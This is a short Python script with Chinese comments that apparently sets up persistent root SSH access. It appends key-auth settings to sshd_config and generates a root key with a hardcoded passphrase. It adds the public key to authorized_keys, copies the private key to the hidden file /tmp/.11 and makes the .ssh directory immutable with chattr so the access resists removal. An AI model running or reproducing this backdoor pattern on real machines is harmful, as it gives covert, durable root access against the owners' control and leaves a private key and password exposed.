# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import os

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def generate_ssh_key(password):
    command = 'ssh-keygen -t ed25519 -N "' + password + '" -q -f /root/.ssh/id_ed25519'
    # 连接PubkeyAcceptedKeyTypes=+ssh-rsa
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()

    if p.returncode == 0:
        print("SSH密钥生成成功！")
    else:
        print("SSH密钥生成失败。错误信息：")
        print(error.decode())

def file_key():
    file_path = "/root/.ssh/authorized_keys"
    if os.path.exists(file_path):
        print("文件写入成功")
    else:
        print("文件写入失败")


if __name__ == '__main__':
    # 调用 miyue 函数来在文件末尾写入新内容
    miyue("HostKey /etc/ssh/ssh_host_ed25519_key")
    miyue("PubkeyAuthentication yes")
    miyue("AuthorizedKeysFile .ssh/authorized_keys")
    # 调用 generate_ssh_key 函数生成SSH密钥对
    password = "admin!@#45123"
    generate_ssh_key(password)
    ml('cat /root/.ssh/id_ed25519.pub >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && chmod 700 /root/.ssh/')
    ml('cp /root/.ssh/id_ed25519 /tmp/.11')
    ml('chattr +i /root/.ssh && chattr +i /root/.ssh/authorized_keys')
    file_key()
